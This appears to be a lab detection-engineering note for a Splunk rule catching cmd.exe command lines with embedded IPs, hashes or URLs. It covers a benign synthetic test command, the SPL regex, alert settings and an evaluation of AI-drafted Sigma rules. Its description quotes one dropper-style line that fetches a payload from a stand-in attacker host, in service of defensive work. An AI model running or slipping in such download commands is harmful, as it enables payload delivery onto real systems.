---
status: saved-search-active
technique_id: T1059.003
tactic: Execution
last_run: 2026-05-20
related: [[../subprojects/2026-04-30-detection-foundations/runbook]], [[../architecture/components/sysmon]], [[../architecture/components/splunk]], [[../decisions/0008-iocs-enriched-code-node-fallback]], [[t1059-001-powershell-encoded]]
---

# T1059.003 — Command and Scripting Interpreter: Windows Command Shell

## Description

T1059.003 is MITRE ATT&CK's sub-technique for adversary use of the Windows command shell (`cmd.exe`) as a scripting interpreter. The variant detected here is **cmd.exe with embedded IOC-shaped strings** in the CommandLine: an IPv4 literal, a SHA-256 hash, or an `http(s)://` URL.

The detection logic is behavioral, not signature-based. A legitimate cmd.exe shell rarely embeds an IP literal or a 64-character hex string in its command line. When one does appear, it's high-signal: real-world examples include dropper tradecraft (`cmd /c curl http://attacker/payload`), C2 lookup commands, file-hash verification against downloaded payloads, and operator-typed reconnaissance.

This detection is the demo/portfolio path used to exercise the full SOAR pipeline including both enrichment tools — the synthetic command embeds a known-malicious IP and a known-malicious file hash so that AbuseIPDB and VirusTotal both have intelligence to return.

ATT&CK reference: https://attack.mitre.org/techniques/T1059/003/

## ART command

ART does not have a canonical built-in test that matches this detection's specific pattern (cmd.exe with embedded IOCs). The detection is exercised by a **synthetic command** instead — same Sysmon event shape as real tradecraft, controlled and reproducible.

```powershell
# Synthetic — runs from any PowerShell prompt on Win10-v2
$guid = [guid]::NewGuid().ToString()
"Firing T1059.003 IOC demo at $(Get-Date -Format 'HH:mm:ss')"
cmd.exe /c "echo demo-$guid && echo IOC_IP=185.220.101.42 && echo IOC_HASH=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f && exit"
```

The command itself is benign — three `echo` statements followed by `exit`. The IOCs are present as **literal strings in the CommandLine field** (which is what Sysmon captures and what the SPL regex matches against). No network connection or file write occurs.

**The embedded IOCs:**

- `185.220.101.42` — real Tor exit relay; AbuseIPDB consistently reports ~100% abuse confidence with extensive scan/brute-force activity
- `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f` — SHA-256 of the EICAR antivirus test file; VirusTotal universally flags it (~65/72 engines)

Using known-bad IOCs in a synthetic test means the enrichment tools have meaningful intelligence to return, which makes the IRIS alert visually demo-worthy (populated abuse score, populated detection ratio).

## Observations

Phase 4 dev event captured 2026-05-20 12:24:21 UTC:

| Field | Value |
|---|---|
| `EventCode` | `1` (Process Create) |
| `Image` | `C:\Windows\System32\cmd.exe` |
| `CommandLine` | `"C:\Windows\system32\cmd.exe" /c "echo demo-<UUID> && echo IOC_IP=185.220.101.42 && echo IOC_HASH=275a021b...fd0f && exit"` |
| `ParentImage` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (when fired from an interactive PS prompt) |
| `User` | `DESKTOP-VNEF7PC\mydfir` |
| `host` | `DESKTOP-VNEF7PC` |

Splunk indexing lag: ~5 seconds (consistent with the T1059.001 worked example).

Saved-search-to-fire delay: bounded by the 5-minute cron tick. Worst case ~5 minutes; typical ~150 seconds.

**ParentImage triage notes for cmd.exe:**

| ParentImage | Likely meaning |
|---|---|
| `explorer.exe` | User-initiated interactive session — usually benign |
| `powershell.exe` | Spawned from a PS session — admin or scripted work |
| `winword.exe` / `excel.exe` / `outlook.exe` | Phishing macro launched cmd |
| `wscript.exe` / `cscript.exe` | Scripted attack chain |
| `WmiPrvSE.exe` | WMI-launched — lateral movement or scheduled task |
| `services.exe` | Service-launched — usually benign Windows operation |
| Unknown / non-system parent | Very suspicious |

In the lab's synthetic-test setup, `powershell.exe` is the expected parent because the synthetic command is launched from a PS prompt.

## SPL

```spl
index=mydfir-project source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1 Image="*\\cmd.exe" CommandLine="*/c*"
| regex CommandLine="(?i)((?:\b\d{1,3}\.){3}\d{1,3}\b|\b[a-f0-9]{64}\b|http://|https://)"
| stats count, values(CommandLine) as command_lines, values(ParentImage) as parents
        by _time, host, User, Image
```

| Clause | What it does |
|---|---|
| `index=mydfir-project` | Narrow to the project's index. |
| `source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"` | Restrict to Sysmon's channel. |
| `EventCode=1 Image="*\\cmd.exe"` | Process-create events for any path ending in `\cmd.exe`. |
| `CommandLine="*/c*"` | Pre-filter to invocations containing `/c` (the `/c` flag — runs a command then exits). Excludes interactive cmd shells. |
| `\| regex CommandLine="..."` | Require an IPv4 literal, a SHA-256 (64-char hex), or an `http(s)://` URL anywhere in the CommandLine. |
| `(?i)` | Case-insensitive flag. |
| `(?:\b\d{1,3}\.){3}\d{1,3}\b` | IPv4 literal pattern. |
| `\b[a-f0-9]{64}\b` | SHA-256 pattern (64 hex chars at a word boundary). |
| `http://\|https://` | URL scheme literal. |
| `\| stats count, values(CommandLine) as command_lines, values(ParentImage) as parents by _time, host, User, Image` | Aggregate to one row per (timestamp, host, user, image), collecting unique CommandLines + parents per group. |

**Note:** the `\d{1,3}` pattern matches any three-digit-or-fewer number per octet. This will accept IP-shaped strings that aren't valid IPs (e.g., `999.999.999.999`). For this lab's purposes, the false-positive cost of accepting invalid IP literals is acceptable. A production tightening would add `(\b\d{1,3}\.){3}\d{1,3}\b` with each octet bounded to `0-255`.

## Saved search

| Field | Value |
|---|---|
| Name | `T1059.003 - Suspicious cmd.exe IOC References` |
| App | `search` (default Splunk Search & Reporting app) |
| Owner | `mydfir` |
| Sharing | `app` (Shared in App) |
| Time Range | `Last 24 hours` (`-24h@h`) |
| Cron | `*/5 * * * *` (every 5 minutes; standard SOC cadence) |
| Trigger | `For each result` (`alert.digest_mode=False`) |
| Threshold | Number of Results > 0 |
| Schedule type | `Run on Cron Schedule` (`realtime_schedule=False` — see runbook gotcha) |
| Throttle | **Enabled** (`alert.suppress=True`) |
| Suppress fields | `_time,host,Image` (see [[../subprojects/2026-04-30-detection-foundations/runbook]] §Recoveries for the corrected recipe) |
| Suppress period | `86400` seconds (24 hours) |
| Trigger Actions | Webhook + Add to Triggered Alerts (severity 5) |
| Webhook URL | `http://192.168.129.132:5678/webhook/db7245f7-8451-4bea-b47d-f6ad35b818cd` (existing v2/v3 production URL — shared with T1059.001) |

### Live-fire validation (2026-05-20)

| Time (UTC) | Generator | IRIS alert | Notes |
|---|---|---|---|
| 12:25 | Synthetic cmd.exe IOC fire | #61 | Full chain green; AbuseIPDB + VT enrichment both fired (`Enriched IOCs` rendered `_none_` due to the Code-node bug eventually fixed by ADR 0008) |
| 19:35 | Synthetic re-fire | #62 | Same `_none_` issue — bug reproduced and located |
| 19:50 | Synthetic re-fire | #64 | **After Code-node fallback fix per ADR 0008** — `Enriched IOCs` section now populates with both IOCs (`185.220.101.42` and the EICAR hash, both type-tagged) |

End-to-end latency from synthetic fire to IRIS alert: ~30-180 seconds (dominated by the cron tick).

## Notes

- **This detection was built specifically as the demo path for the portfolio recording.** T1059.001 (the original worked example) uses a `Write-Host <GUID>` payload that, once base64-decoded, contains no IOCs — Claude correctly chose not to invoke enrichment tools on that payload. T1059.003 with embedded IOC strings is the cleanest single example that exercises the full chain including both enrichment tools, which is what makes for compelling demo content.
- **The enrichment chain is what makes this detection demo-grade.** AbuseIPDB returns ~100% abuse confidence + Tor-exit identification on the IP; VirusTotal returns the EICAR identification with ~65/72 engine consensus. Claude integrates both into the `alert_summary` and `severity_rationale` prose. The Code-node fallback (ADR 0008) ensures the IRIS `Enriched IOCs:` section is populated regardless of whether the LLM populates the `iocs_enriched` structured field.
- **False positives in the lab so far: zero.** Legitimate cmd.exe `/c` invocations on Win10-v2 (system tasks, scheduled tasks, package managers) don't typically include IP literals or SHA-256 hashes in their command lines. Production tuning would likely benefit from an allowlist of known-good cmd lines (system update tasks, monitoring agents) before deployment outside the lab.
- **Severity calibration:** Claude consistently rates these alerts `low` because the synthetic command itself performs no harmful action (echo + exit, no network call, no file write). The IOCs are referenced as literal strings, not contacted. The rationale text explicitly calls out the `demo-<UUID>` marker as a synthetic-test signature. For real-world cmd.exe with embedded IOCs (where the command actually executes the dropper/lookup), severity would calibrate higher.
- **Demo recording reference:** see [[../sources/session-notes/2026-05-19-demo-video-script]] for the full demo-video script that uses this detection as its end-to-end example.

## Claude-drafted Sigma (Phase 2)

Phase 2 also ran the AI drafter (Claude Opus 4.8, RAG-grounded, 4-tier gate) against this technique. Honest result: **0/5 passed the gate**, 95% CI [0.00, 0.52], all five failing at the **T4 quiet-on-benign** tier. No rule was cataloged, on purpose. Full report: `detection-authoring/reports/authoring-cab1e37.md`.

This is the informative outcome, not a failure of the pipeline. `first_fail_tier=t4_tn` on all five means every draft *passed* parse, subset, compile, and **fired correctly on the malicious positives (T3)**, then failed only at staying quiet on the benign `cmd.exe` baseline. The model detects the behavior fine, it just can't separate malicious `cmd.exe` use from ordinary admin `cmd.exe` use, which is exactly the hard part here: `cmd.exe` is everywhere in normal activity, unlike encoded PowerShell. The deterministic gate refused to bless a noisy rule, which is the whole value of verifying rather than trusting LLM output.

Contrast with [[t1059-001-powershell-encoded]], where the same drafter went 5/5 once steered off list-of-maps selections. The difference is the technique, not the pipeline: a high-signal behavior (encoded PowerShell) is easy to author cleanly, a low-signal one (cmd.exe with embedded IOC strings) is genuinely hard to make FP-quiet, and the gate says so honestly.
